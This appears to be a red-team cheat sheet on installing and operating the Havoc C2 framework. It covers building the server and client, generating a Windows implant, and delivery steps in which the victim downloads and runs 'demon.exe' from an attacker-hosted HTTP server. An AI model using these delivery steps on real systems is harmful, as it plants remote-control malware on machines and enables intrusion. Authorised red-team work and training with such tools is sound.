# ☸️ Havoc C2

## Havoc C2 Installation and Usage Guide

### Installation

```
# Install on Kali
sudo apt install havoc

# Manual Installation
git clone https://github.com/HavocFramework/Havoc.git

cd Havoc

sudo apt install -y git build-essential apt-utils cmake libfontconfig1 libglu1-mesa-dev libgtest-dev libspdlog-dev libboost-all-dev libncurses5-dev libgdbm-dev libssl-dev libreadline-dev libffi-dev libsqlite3-dev libbz2-dev mesa-common-dev qtbase5-dev qtchooser qt5-qmake qtbase5-dev-tools libqt5websockets5 libqt5websockets5-dev qtdeclarative5-dev golang-go qtbase5-dev libqt5websockets5-dev python3-dev libboost-all-dev mingw-w64 nasm

# Build the Teamserver
cd teamserver
go mod download golang.org/x/sys
go mod download github.com/ugorji/go
cd ..

# Install musl Compiler & Build Binary (From Havoc Root Directory)
make ts-build

# Run the teamserver
./havoc server --profile ./profiles/havoc.yaotl -v --debug

# Build the client Binary (From Havoc Root Directory)
make client-build

# Run the client
./havoc client
```

### Create a Listener

```
View -> Listeners

Click on Add

Enter a Name

Select a Payload

Choose the Host(Bind)

Enter
```

### Create a Payload

```
Attack -> Payload

Select Arch as x64

Select Format as Windows exe

Select Sleep Technique as Ekko

Click on Generate
```

### Deliver and Execute

```
# On the attacker machine
python3 -m http.server 8080

# On the victim machine
iwr http://<attacker ip>:8080/demon.exe

# Execute (Victim machine)
.\demon.exe
```

### Lateral Movement

```
# Graph View
View -> Session View -> Graph

# Help menu
Right click on the machine -> Interact

Type help in the bottom pane

```

***

## REFERENCES

* https://chennylmf.medium.com/install-havoc-c2-framework-on-kali-linux-f174ee8014c6
* https://medium.com/@r1ckyr3c0n/havoc-c2-framework-part-1-installation-2024-2fbb8a1fe31c
* https://havocframework.com/docs/installation
* https://havocframework.com/docs/
* https://www.hackers-arise.com/post/command-control-series-part-i-installing-your-own-c2-server-on-kali-linux
